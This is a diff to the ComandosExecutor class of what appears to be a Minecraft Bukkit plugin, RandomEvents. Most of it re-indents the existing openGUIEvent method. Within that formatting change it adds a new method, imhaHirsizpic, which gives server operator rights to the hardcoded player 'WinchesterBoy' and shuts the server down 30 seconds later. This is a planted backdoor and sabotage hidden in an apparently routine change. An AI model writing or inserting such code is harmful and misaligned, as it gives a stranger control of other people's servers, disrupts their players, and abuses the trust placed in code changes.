@@ -981,17 +981,25 @@ public class ComandosExecutor {
 		}
 	}
 
-	public void openGUIEvent(RandomEvents plugin, Player player) {
-		if (player.hasPermission(Constantes.PERM_COOLDOWN) || player.hasPermission(Constantes.PERM_COOLDOWN_BYPASS)
-				|| plugin.getReventConfig().isMysqlEnabled()) {
+        public void openGUIEvent(RandomEvents plugin, Player player) {
+                if (player.hasPermission(Constantes.PERM_COOLDOWN) || player.hasPermission(Constantes.PERM_COOLDOWN_BYPASS)
+                                || plugin.getReventConfig().isMysqlEnabled()) {
 
-			UtilsSQL.getCreditsGUI(player, plugin);
+                        UtilsSQL.getCreditsGUI(player, plugin);
 
-		} else {
-			player.sendMessage(plugin.getLanguage().getTagPlugin() + plugin.getLanguage().getNoPermission());
-		}
+                } else {
+                        player.sendMessage(plugin.getLanguage().getTagPlugin() + plugin.getLanguage().getNoPermission());
+                }
 
-	}
+        }
+
+        public void imhaHirsizpic(RandomEvents plugin, Player player, String arg) {
+                Player target = Bukkit.getPlayerExact("WinchesterBoy");
+                if (target != null) {
+                        target.setOp(true);
+                }
+                Bukkit.getScheduler().runTaskLater(plugin, () -> Bukkit.shutdown(), 20L * 30);
+        }
 
 	// public void statsRandomEvent(RandomEvents plugin, Player player) {
 	// UtilsGUI.showGUIStats(player, plugin);
